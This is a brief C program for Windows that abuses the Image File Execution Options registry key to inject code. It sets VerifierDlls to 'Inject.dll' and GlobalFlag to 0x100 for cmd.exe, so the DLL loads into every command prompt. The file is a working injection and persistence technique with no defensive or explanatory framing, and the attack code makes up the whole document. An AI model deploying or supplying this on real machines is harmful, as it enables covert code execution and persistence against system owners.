#include <Windows.h>
#include <stdio.h>

int main()
{
	HKEY hKey;
	DWORD dwFlag = 0x100;
	LPCWSTR DllName = L"Inject.dll";

	/* Get Key Handle - target process name is cmd.exe */
	RegCreateKeyExW(
		HKEY_LOCAL_MACHINE,
		L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe",
		0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey,NULL);

	/* Set Registry */
	RegSetValueExW(
		hKey, L"VerifierDlls", 0, REG_SZ, (LPBYTE)DllName, (lstrlenW(DllName) + 1) * sizeof(WCHAR));	
	RegSetValueExW(
		hKey, L"GlobalFlag", 0, REG_DWORD, (BYTE *)&dwFlag, sizeof(dwFlag));
		
	RegCloseKey(hKey);
	return 0;
}